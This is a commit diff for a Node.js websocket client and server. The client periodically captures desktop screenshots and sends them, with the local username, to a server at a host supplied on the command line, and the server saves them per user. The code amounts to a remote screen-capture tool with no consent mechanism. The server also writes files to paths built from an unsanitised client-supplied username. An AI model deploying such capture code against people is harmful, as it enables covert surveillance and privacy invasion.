2e2cc5eeed0b07dedaabe634dfca5f6f3667ff70
ac2f <mustafabasarn3@gmail.com>
2022-06-09 19:25:54 +0300

    Final

--- client/index.js
+++ client/index.js
@@ -1,3 +1,4 @@
+const os = require("os");
 const md5 = require("md5");
 const fs = require("fs");
 const websocket = require('ws');
@@ -5,32 +6,38 @@ const screenshot = require('desktop-screenshot');
 const startsWith = (text, check) => (text.length+1>=check.length && text.slice(0, check.length) === check);
 const verbose = (text) => console.log(text);
 const takeScreenshot = () => {
-    screenshot('screenshot.png', function (error, complete) {
-        if (error){
-            verbose('Screenshot failed', error);
-        } else {
-            var image = fs.readFileSync("screenshot.png");
-            verbose(`Screenshot taken! MD5: "${md5(image)}". Sending..`);
-            var uname = "unamexxejqwejwqejqejwqjeqwje||"
-            verbose(`${image[0]}`)
-            client.send( Buffer.from(uname + ("-".repeat(100-uname.length))) + Buffer.from(image));
-        };
-    });
+    if (tmpCounter>1) {
+        screenshot('screenshot.png', function (error, complete) {
+            if (error){
+                verbose('Screenshot failed', error);
+            }
+            if (complete){
+                var image = fs.readFileSync("screenshot.png");
+                verbose(`Screenshot taken! MD5: "${md5(image)}". Sending..`);
+                verbose(`Byte at index: ${(image.length/2)-1} is "${image[(image.length/2)-1]}" (the char at half of image bytes) Size of Bytes: ${image[(image.length/2)-1]}`);
+                var data = Buffer.from(JSON.stringify({"uname": os.userInfo().username, "image": image}));
+                client.send(data);
+            };
+        });
+    }
 };
-var nextSendTimestamp = Date.now() * 2;
-var cachedTimestamp = nextSendTimestamp;
-var wsEndPoint = 'ws://127.0.0.1:9999';
+var tmpCounter = 0;
+var delay = 1000;
+// var cachedTimestamp = delay;
+// var wsEndPoint = 'ws://127.0.0.1:9999';
+if (process.argv.length < 4){console.log("You must type HOST and PORT as a parameter to connect the server");process.kill()};
+var wsEndPoint = `ws://${process.argv[2]}:${process.argv[3]}`;
 const client = new websocket.WebSocket(`${wsEndPoint}`);
 client.on('open', async (ws) => {
     verbose(`Connected to server! Host: ${wsEndPoint}`);
     while (!client.CLOSING || !client.CONNECTING || !client.CLOSED) {
         client.send("ts");
-        verbose(`Timestamp to send screenshot at: ${nextSendTimestamp}`);
-        if (nextSendTimestamp <= Date.now() && cachedTimestamp !== nextSendTimestamp){
+        verbose(`Delay before next screenshot send: ${delay}`);
+        // if (delay <= Date.now() && cachedTimestamp !== delay){
             takeScreenshot();
-            cachedTimestamp = nextSendTimestamp;
-        };
-        await new Promise(t => setTimeout(t, 1000));
+        //     cachedTimestamp = delay;
+        // };
+        await new Promise(t => setTimeout(t, delay));
     }
 });
 client.on("message", (data) => {
@@ -38,5 +45,6 @@ client.on("message", (data) => {
     if (dataText === "true")
         return;
     verbose(`New response from server! Response: ${dataText}`);
-    nextSendTimestamp = dataText;
+    delay = dataText;
+    tmpCounter += 1;
 })
--- server/index.js
+++ server/index.js
@@ -11,29 +11,37 @@ var reservations = {};
 //     while (condition) {
 //         ws
 //         await new Promise(t => setTimeout(t, 1000));
-//     }
+//     
 // }
 wss.once("listening", (ws) => {
-    console.log(`Listening.. Port:  ws://${wss.options.host??"localhost"}:${wss.options.port}`);
+    console.log(`Listening.. Port:  ws://${wss.options.host?wss.options.host:"localhost"}:${wss.options.port}`);
 })
 wss.on("connection", async (ws) => {
     console.log(`New client connected!`)
   ws.on("message", (data) => {
     dataText = data.toString();
     if (startsWith(dataText, "ts")){
-        ws.send(readFileAsText("timestamp.txt"));
+        ws.send(readFileAsText("delay.txt"));
         return;
-    } else if (){
+    } else if (startsWith(dataText, "wqjeqwjkejjj")){
       // TODO: HERE
     }
     else {
-        var username = data.slice(0, 100).toString();
-        var image = data.slice(100,data.length+1000);
-        console.log(`username: ${username}    -   imageLength: ${image[0]} ${image[1]} ${image[2]} ${image[3]} ${image[4]} ${image[5]} ${image[6]} ${image[7]} ${image[8]} ${image[9]} ${image[10]} `)
-        // return
-        console.log(`Image taken from ${username.split("||")[0]}! Length: ${image.byteLength}`);
-        fs.writeFileSync("x.png", image);    
+      console.log(JSON.parse(data));
+      var dataJson = {};
+      try {
+        dataJson = JSON.parse(data);
+      } catch (error) {
+        console.log(error);
+        return;
+      }
+        var image = dataJson.image.data;
+        var uname = dataJson.uname;
+        console.log(`[${uname}] Image taken! Byte at index: ${(image.length/2)-1} is "${image[(image.length/2)-1]}" (the char at half of image bytes) Size of Bytes: ${image[(image.length/2)-1]}`);
+        if (!fs.existsSync(`images/${uname}`)) fs.mkdirSync(`images/${uname}`);
+        var dt = new Date();
+        fs.writeFileSync(`images/${uname}/${dt.getFullYear()}-${dt.getMonth()}-${dt.getDay()}  ${dt.getHours()}-${dt.getMinutes()}-${dt.getSeconds()}--${Date.now()}.png`, Buffer.from(image));
         ws.send("true");
-    }
+    };
   }); 
-})
+});
